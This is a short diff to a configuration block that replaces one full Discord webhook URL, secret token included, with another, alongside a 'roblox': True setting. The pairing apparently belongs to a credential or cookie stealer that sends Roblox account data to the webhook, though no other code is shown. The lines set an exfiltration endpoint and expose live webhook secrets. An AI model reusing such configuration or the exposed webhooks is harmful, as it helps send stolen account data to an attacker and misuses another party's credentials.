@@ -1,6 +1,6 @@
 
 __CONFIG__ = {
-    "webhook": "https://discord.com/api/webhooks/1243914498809790496/CJOH3w-0j0mCx4LatAp8NYitFV76TX9SoaxaE-PeeBMwSv2a75lhdcmIrGprYuiRDNOw",
+    "webhook": "https://discord.com/api/webhooks/1361570999354527826/Z7RoX24SRG5Z7uaVFaN4I9XxIlqGpnG0XZxUbRzoIs3XcFJYuzvKhYGkpwD-ipJir7rT",
     "roblox": True, 
 }
 
